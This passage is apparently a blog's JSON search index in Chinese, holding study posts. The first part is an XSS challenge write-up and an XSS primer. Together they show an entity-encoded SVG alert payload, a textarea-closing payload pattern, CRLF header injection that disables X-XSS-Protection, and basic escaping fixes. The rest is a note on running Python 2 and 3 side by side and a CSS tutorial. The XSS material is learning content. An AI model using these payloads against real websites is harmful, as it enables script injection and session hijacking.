标签，其有一个特性就是可以执行HTML实体代码。用法是&lt;svg&gt;&amp;#数字;所以构造payload:&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;&lt;/svg&gt;","categories":[],"tags":[{"name":"XSS","slug":"XSS","permalink":"http://chumen77.xyz/tags/XSS/"}]},{"title":"XSS知识简单学习","slug":"xss学习","date":"2019-08-16T08:21:01.000Z","updated":"2020-02-28T07:54:44.000Z","comments":true,"path":"2019/08/16/xss学习/","link":"","permalink":"http://chumen77.xyz/2019/08/16/xss学习/","excerpt":"","text":"XSS知识简单学习一:Xss简介XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中比如这些代码包括HTML代码和客户端脚本。攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode”。 二：ajax简介ajax其实就是异步JavaScript和xml，其最大优势在于可以实现异步访问。为什么要用AJAX，首先它够隐秘，也就是所谓的“无刷新”，其次，它能更有效地迅速处理各种复杂多变的数据。其可以实现异步更新和跨域。 三：xss漏洞分类存储XSS存储XSS,会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。也就是提交JS攻击代码存储到数据库然后再输出。 用户输入的地方最容易滋生XSS，譬如留言、评论等表单，一个的留言本，因为没有对用户输入的变量作出合适的过滤，导致一个XSS的产生。留言率先传递给管理员，当作javascript劫持，我们就可以利用管理员的权限做任何事情。当内容通过审核，发布到网站，此时所有的web浏览用户都有可能受到XSS，我们能获得更多的会话劫持。 反射型XSS攻击反射型XSS攻击也是非持久型XSS攻击，其是一次性的，仅对当次的页面访问产生影响。非持久型XSS攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的，其是经过服务器的。 其需要黑客进行诱骗使用户访问这个带有xss攻击的链接后，便被JavaScript劫持，收到攻击。 Dom-xss通过URL传入参数所触发，其不与服务器进行通信，但是我们的js攻击代码可以被执行，这是需要分析页面源码然后进行利用，是存在客户端页面的脚本自身中。 四：X-XSS-Protection是浏览器对xxs防护的一个策略，这个可以通过抓包软件，修改头来进行绕过。筒単一句活:`header(“X-XSS-Protection: 0”);告泝浏览器禁用XSS保枦header(“X-XSS-Protection: 1”);告泝浏览器幵宕XSS保枦` 五：CRLF响应头注入Location: http://****%0d%0aX-XSS-Protection: 0就是相当于`Location: http://****XSS-Protection: 0`这就是一个注入，又添加了一个响应头。但是这种漏洞在php版本&gt;5.1时候是不行的，因为其不允许在HTTP头中出现两个属性。应用场景： php&lt;5.1 碰到了服务器开启xss拦截 六：修补xss漏洞（简单）过滤例如 &gt; &lt; Script等等字眼 转义利用php函数 htmlentities()把字符转换为HTML实体 七：闭合xss当你的js代码被浏览器直接显示出来后，考虑是否是其源码里对你的js代码做了textarea标签处理，然后就需要我们去闭合这个textarea标签，比较通用的就是&#39;&quot;&gt;&lt;/textarea&gt;+js代码 即可。","categories":[],"tags":[{"name":"XSS","slug":"XSS","permalink":"http://chumen77.xyz/tags/XSS/"}]},{"title":"简易解决python2.X与python3.x共存问题","slug":"简易解决python2.X与python3.x共存问题","date":"2019-04-02T15:05:47.000Z","updated":"2020-02-28T07:54:57.000Z","comments":true,"path":"2019/04/02/简易解决python2.X与python3.x共存问题/","link":"","permalink":"http://chumen77.xyz/2019/04/02/简易解决python2.X与python3.x共存问题/","excerpt":"","text":"简易解决python2.X与python3.x共存问题python3.x不兼容Python2.x，语法有许多不同，但很多工具还是需要2.x版本，自己又是初学者，只是跑跑别人的脚本，不会改语法冲突。。。。下面说解决办法。 安装模块Python目前还是需要分开安装 py -2 -m pip install xxxx py -3 -m pip install xxxx 运行脚本分别用py2.x py3.x运行一个1.py的脚本： py -2 1.py py -3 1.py 或者在1.py的文件代码头加上#! python3 #! python2看个人的情况。 这样就直接输入： py 1.py 这只是解决了简单的安装模块和运行脚本的问题。","categories":[],"tags":[{"name":"杂项","slug":"杂项","permalink":"http://chumen77.xyz/tags/杂项/"}]},{"title":"css学习","slug":"css学习","date":"2019-03-30T14:48:12.000Z","updated":"2020-02-28T07:55:03.000Z","comments":true,"path":"2019/03/30/css学习/","link":"","permalink":"http://chumen77.xyz/2019/03/30/css学习/","excerpt":"","text":"CSS如何使用CSSCSS可以通过以下方式添加到HTML中: 内联样式- 在HTML元素中使用”style” 属性 (不推荐使用)； 内部样式表 -在HTML文档头部 &lt;head&gt; 区域使用&lt;style&gt;元素 来包含CSS。 外部引用 - 使用外部 CSS 文件(==推荐使用)== 内联样式应用到个别元素时，就可以使用内联样式。 &lt;div style=&quot;color: red;width: 100px; height: 100px; background: yellow&quot;&gt;苹果&lt;/div&gt; 内部样式表当单个文件需要特别样式时，就可以使用内部样式表。你可以在&lt;head&gt; 部分通过 &lt;style&gt;标签定义内部样式表:。也推荐这样使用便于更改全局。 &lt;head&gt; &lt;style&gt; div{ color: red; width: 100px; height: 100px; background: yellow } &lt;/style&gt; &lt;/head&gt; 注：在头文件写的时候 style还是个开闭标签。 外部样式表用&lt;link&gt;当样式需要被应用到很多页面的时候，外部样式表将是理想的选择。 &lt;head&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;mystyle.css&quot;&gt; &lt;/head&gt; 其中“rel=”stylesheet” type=”text/css””这是固定的,”mystyle.css”这是css的地址； 练习：&lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;css三种引入方式&lt;/title&gt; &lt;!-- &lt;style&gt; div{ color: red; width: 100px; height: 100px; background: yellow } &lt;/style&gt; --&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;1.css&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- &lt;div style=&quot;color: red;width: 100px; height: 100px; background: yellow&quot;&gt;苹果&lt;/div&gt; --&gt; &lt;div&gt; 苹果1&lt;/div&gt; &lt;/body&gt; &lt;/html&gt; div{ color: red; width: 100px; height: 100px; background: yellow } &lt;!-- 1.css --&gt; 效果： CSS 语法CSS 语法规则由两个主要的部分构成：选择器，以及一条或多条声明: 选择器通常是您需要改变样式的 HTML 元素。 每条声明由一个属性和一个值组成。 属性是您希望设置的样式属性。每个属性有一个值。属性和值被冒号分开。 CSS声明总是以分号(;)结束，声明组以大括号({})括起来 例：h1{ color:blue; font-size :12px;} 其中h1 为选择器 color 是属性 blue是值。 CSS 注释：CSS注释以 “/*“ 开始, 以 “*/“ 结束。 颜色：颜色属性被用来设置文字的颜色。 颜色是通过CSS最经常的指定： 十六进制值 - 如: ＃FF0000 一个RGB值 - 如: RGB(255,0,0) 颜色的名称 - 如: red 常用的：rgb：：r是红色，g是绿色，b是蓝色。 body {color:red;} h1 {color:#00ff00;} /* 可以写成 #0f0 */ h2 {color:rgb(255,0,0);} /* 0-255 */ 是其颜色深浅 ==注 - 所有浏览器都不支持颜色的rgb（）属性，因此建议不要使用它。== CSS选择器基本选择器： id 选择器：可以为标有特定 id 的 HTML 元素指定特定的样式。HTML元素以id属性来设置id选择器,CSS 中 id 选择器以 “#” 来定义。（==ID属性不要以数字开头==） class 选择器：class 选择器用于描述一组元素的样式，class 选择器有别于id选择器，class可以在多个元素中使用。 例：&lt;p class=&quot;txt txt2&quot;&gt;aaa&lt;/p&gt; 。class 选择器在HTML中以class属性表示, 在 CSS 中，类选择器以一个点“.”号显示 *通配符：全部标签属性的都会有效果。 标签 div：div标签 的会有效果。 练习： &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;css选择器&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;1.css&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt;div111 &lt;div&gt;div222&lt;/div&gt; &lt;p id=&quot;txt&quot;&gt;the way i am&lt;/p&gt; &lt;p class=&quot;txt1 txt2&quot;&gt;song&lt;/p&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; css： div{ color: red; width: 100px; height: 100px; background: yellow } #txt{ color: #1f1; } .txt1 { font-size: 10px; } .txt2 { color: #ff2; } 效果： CSS原理优先原则优先原则：后解析的内容，会覆盖掉原来解析的内容。 1:同一个选择器:从上往下执行。 例： div{ color: red; color: green; }/*最终是为绿色*/ 2:同一类型的选择器：从上往下执行 例： div{ background: yellow; } div{ background: red; }/*最终是为红色*/ .bg1{ background: yellow; } .bg2{ background: blue; }/*最终是为蓝色*/ &lt;div class=&quot;bg1 bg2&quot;&gt;hahaha&lt;/div&gt; 在HTML中，bg1 与bg2的位置交换也不管css解析的事情，所以交换后还是blue。 3：不同类型的选择器：看优先级 先解析低级的在解析高级的：* &lt; div &lt; class &lt; id div{ color: red； } .bg1{ color: yellow; } /*最终是为黄色*/ 4：多重样式优先级 样式可以规定在单个的 HTML 元素中，在 HTML 页的头元素中，或在一个外部的 CSS 文件中。甚至可以在同一个 HTML 文档内部引用多个外部样式表。 一般情况下，优先级如下： 内联样式 &gt; 内部样式 &gt;外部样式 ==（谁优先级越高越最后解析）== 对于全部都是 当加上!important 这个选择器的内容就会最后进行。 继承原则==对于嵌套标签，子级继承父级。== 文字 文本 样式可以继承，其他的不能。 块级元素 没有设置的时候，会继承父级的宽，而高度则是看其内容长短。 CSS组成选择器分组选择器直接上代码了： div{ background: green; color: red; } p{ background: green; color: red; font-size: 50px; } div,p{ background: green; color: red; } p{ font-size: 50px; } 把div 与 p 里面相同的部分放到一个里面就行了。 嵌套选择器div p{ background: green; color: red; font-size: 50px; } &lt;body&gt; &lt;div&gt; div1 &lt;div&gt;div2 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p&gt;p3&lt;/p&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;p&gt;p1&lt;/p&gt; &lt;/body&gt; 只要在其父或父的以上级有div，那这个p里的东西就能生效。 效果： 子选择器这个和以上很类似，区别在只在其父为div时，才能生效。 div&gt;p{ background: green; color: red; font-size: 50px; } 类比以上就是只有p2有css效果 同级选择器div+p{ background: green; color: red; font-size: 50px; } 在平级的p才可以生效，对比以上，也就是p1是有css效果。 属性选择器p[title=cc]{ background: green; color: red; font-size: 50px; } &lt;body&gt; &lt;div&gt; div1 &lt;div&gt;div2 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p title=&quot;cc&quot;&gt;p3&lt;/p&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;p title=&quot;cc 1&quot;&gt;p1&lt;/p&gt; &lt;/body&gt; 基本标签==+== [属性=值]：p3出现css效果。 [属性~=值]：p1 p3出现css效果。 注意：代码中cc 1需要空格隔开，不隔没有效果。 [属性^=值]：开头有cc的字符就行cc1. p1 p3 出现cc效果。 [属性$=值]：类比^= 是结束。 伪元素选择器每个我自己写出来的元素都会有伪元素。、 例： &lt;p title=&quot;cc&quot;&gt; &lt;!--&lt;before&gt; --&gt; ppp &lt;!--&lt;after&gt; --&gt; &lt;/p&gt; 直接上代码： p::before{ content: &quot;before&quot; } p::after{ content: &quot;after&quot; } 效果： 块元素： 第一个字母：first-letter 第一行：first-line p::first-letter{ color: red; font-size: 100px; } 这些写就是会是p内内容第一个字符大写。 也可以为 &lt;p title=&quot;cc&quot;&gt; &lt;first-letter&gt;t &lt;/first-letter&gt; he way i am ; &lt;/p&gt; CSS 背景CSS 背景属性用于定义HTML元素的背景。 背景颜色background-color 属性定义了元素的背景颜色. 页面的背景颜色使用在body的选择器中: body {background-color:red;} 背景图像background-image属性描述了元素的背景图像. 默认情况下，背景图像进行平铺重复显示. body {background-image:url(&#39;1.png&#39;);} 背景图像 - 相关设置 水平或垂直平铺： body { background-image:url(&#39;gradient2.png&#39;); background-repeat:repeat-x; } 里面repeat-x是x轴，repeat-y是y轴。 不平铺：background-repeat:no-repeat 定位： ​ background-position:50% 0% 这使其在x轴的中心， ​ x： left center right； ​ y: top center bottom； css字体css字体 字体系列：font-family 属性设置文本的字体系列，应该设置几个字体名称作为一种”后备”机制。 例：font-family:&quot;黑体&quot;, &quot;宋体&quot;,&quot;微软黑雅&quot;; 字体样式:font-style:italic;斜体 字体大小：font-size 属性设置文本的大小。font-size:40px; font-weight: 设置其粗细。font-weight: normal lighter blod; 练习： body { font-family: &quot;黑体&quot;,&quot;宋体&quot;; font-style:italic; font-size:80px; font-weight: bold; } /*5.css */ &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;文字-字体&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;5.css&quot;&gt; &lt;/head&gt; &lt;body&gt; 这是一段字 &lt;br&gt; hello world! &lt;/body&gt; &lt;/html&gt; CSS - 文本文本属性集合 color属性用于设置文本的颜色 direction属性用于设置文本方向。 letter-spacing属性用于在组成单词的字母之间添加或减去空格。 text-indent属性用于缩进段落的文本。 text-align属性用于对齐文档的文本。 text-decoration属性用于下划线，上划线和删除文本。 text-transform属性用于大写文本或将文本转换为大写或小写字母。 white-space属性用于控制文本的流和格式。 text-shadow属性用于设置文本周围的文本阴影。 文本颜色： 十六进制值 - 如: ＃FF0000 一个RGB值 - 如: RGB(255,0,0) ==不推荐使用太多浏览器不支持== 颜色的名称 - 如: red body {color:red;} h1 {color:#00ff00;} h2 {color:rgb(255,0,0);} 文本的对齐方式文本可居中或对齐到左或右,两端对齐. .a1{ text-align:right; } .a2{ text-align:center; } .a3{ text-align:left; } &lt;body&gt; &lt;p class=&quot;a1&quot;&gt;这是一段字&lt;/p&gt; &lt;br&gt; &lt;p class=&quot;a2&quot;&gt;hello world!&lt;/p&gt; &lt;p class=&quot;a3&quot;&gt;hhhhaaaa&lt;/p&gt; &lt;/body&gt; 文本修饰装饰文字，值为none（去掉修饰），underline，overline，line-through，blink。 .a1{ text-decoration:overline; } .a2{ text-decoration:line-through; } .a3{ text-decoration:underline; } 文本缩进文本缩进属性是用来指定文本的第一行的缩进。 p {text-indent:50px;} 文本方向值是ltr或rtl。 .a{ direction:rtl; } 文字就先写到这。 CSS 链接链接样式 a:link - 正常，未访问过的链接 a:visited - 用户已访问过的链接 a:hover - 当用户鼠标放在链接上时 a:active - 链接被点击的那一刻 a:link {color: red;} CSS列表常用的就是 ul{ list-style-type: none; list-style-type: disc; 实心圆 list-style-type: circle; 空心圆 list-style-type: square; 实心方格 } 最常用就是 none 然后换成自己想弄成的图片。 ol 对应就是 lower-alpha upper-alpha lower-roman等等； 作为列表项标记的图像 ul { list-style-image: url(&#39;&#39;); }","categories":[],"tags":[{"name":"css","slug":"css","permalink":"http://chumen77.xyz/tags/css/"}]}]}